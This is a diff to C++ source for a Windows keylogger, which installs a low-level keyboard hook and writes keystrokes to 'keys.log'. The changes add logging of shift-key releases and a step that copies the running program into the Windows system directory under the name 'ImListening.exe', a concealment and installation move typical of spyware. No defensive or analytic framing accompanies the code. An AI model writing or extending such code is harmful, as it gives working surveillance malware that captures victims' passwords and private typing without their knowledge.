@@ -1,13 +1,21 @@
 #include <stdio.h>
+#include <iostream>
 #include <windows.h>
+#include <string>
 
 using namespace std;
+
+string getExePath(void);
 
 HHOOK hKeyHook;
 KBDLLHOOKSTRUCT kbdStruct;
 
 BYTE keyState[256];
 WCHAR buffer[16];
+
+char systemPath[MAX_PATH];
+char pathtofile[MAX_PATH];
+HMODULE GetModH = GetModuleHandle(NULL);
  
 LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -24,8 +32,11 @@ LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
         
         switch((unsigned int)kbdStruct.vkCode){
               case 0xA1:
+                   fprintf(LOG,"[right shift down]");
+              break;
+              
               case 0xA0:
-                    fprintf(LOG,"[shift]");
+                    fprintf(LOG,"[shift down]");
               break;   
               
               case 0x8:
@@ -87,6 +98,26 @@ LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
         
     }
     
+    if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYUP) || (wParam == WM_KEYUP)))
+    {
+            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam); 
+             
+            FILE *LOG;
+            LOG = fopen("keys.log", "a");
+            
+            switch((unsigned int)kbdStruct.vkCode){
+                             
+              case 0xA1:
+                   fprintf(LOG,"[right shift up]");
+              break;
+              
+              case 0xA0:
+                    fprintf(LOG,"[left shift up]");
+              break;
+            }
+            fclose(LOG);  
+    }
+    
     return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
 }
  
@@ -95,6 +126,22 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine,
     hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);
      
     MSG message;
+    
+    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
+    GetSystemDirectory(systemPath,sizeof(systemPath));
+    
+    const char *exePath = getExePath().c_str();
+    
+    cout << "checking" << endl;
+    
+    cout << systemPath << " ---- " << exePath << endl;
+    
+    if (strcmp(systemPath, exePath)!= 0){
+          strcat(systemPath,"\\ImListening.exe");
+          CopyFile(pathtofile,systemPath,false);  
+          cout << "moved to: " << systemPath << "\nfrom: " << pathtofile << endl;
+    }
+    
     while(GetMessage(&message, NULL, 0, 0))
     {
         TranslateMessage(&message);
@@ -103,5 +150,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine,
      
     UnhookWindowsHookEx(hKeyHook);
     return 0;
+}
+
+string getExePath() {
+    char buffer[MAX_PATH];
+    GetModuleFileName( NULL, buffer, MAX_PATH );
+    string::size_type pos = string( buffer ).find_last_of( "\\/" );
+    return string( buffer ).substr( 0, pos);
 }
 
